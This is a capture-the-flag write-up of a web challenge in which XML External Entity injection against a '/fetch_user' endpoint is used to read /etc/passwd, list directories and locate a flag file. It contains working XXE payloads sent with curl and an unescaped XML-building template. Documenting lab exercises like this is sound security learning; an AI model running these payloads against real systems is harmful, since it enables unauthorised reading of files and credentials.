# SAFCTF — Archived (XXE) — "Relic Society"

- **Category:** Web
- **Vulnerability:** XML External Entity (XXE) Injection

## The setup

A "Fetch User Data" form took a numeric User ID. Reading the page source showed
the frontend built raw XML client-side and POSTed it to `/fetch_user` with
`Content-Type: application/xml`, with no escaping of the input:

```js
const requestXml = `<request><id>${userId}</id></request>`;
```

## Commands run

**1. Confirmed IDOR-style behavior first** (red herring — real vuln was XXE):

```bash
# Tried IDs 1-4 via the UI; all valid, rest empty
```

**2. First injection attempt via the browser form field** — failed, because the
JS template always appended its own closing tags after the input:

```
1</id></request><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><id>&xxe;</id></request>
```

→ `{"message":"Invalid input"}` (the server's generic error for malformed XML)

**3. Bypassed the form entirely — sent the raw POST directly with curl:**

```bash
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><id>&xxe;</id></request>'
```

→ Returned `/etc/passwd` contents inside the `<id>` tag. XXE confirmed.

**4. Hunted for the flag file by walking the filesystem via the same technique:**

```bash
# Guessed common paths — all failed with "Invalid input" (file not found)
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///home/ctfuser/flag.txt">]>
<request><id>&xxe;</id></request>'

curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<request><id>&xxe;</id></request>'

# Listed a directory instead of reading a file:
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///home/ctfuser/">]>
<request><id>&xxe;</id></request>'
# → revealed: .bash_logout, .bashrc, .profile, app.jar (no flag here)

# Listed the filesystem root directly:
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///">]>
<request><id>&xxe;</id></request>'
# → revealed: flag8b9d5b8e264a.txt sitting at the filesystem root
```

**5. Read the discovered flag file:**

```bash
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///flag8b9d5b8e264a.txt">]>
<request><id>&xxe;</id></request>'
```

> **Note:** the original notes did not record the flag string returned by this
> final request; only the flag filename (`/flag8b9d5b8e264a.txt`) is preserved.

## Root cause

The backend parsed client-supplied XML without disabling external entity
resolution, allowing arbitrary local file reads and directory listings.
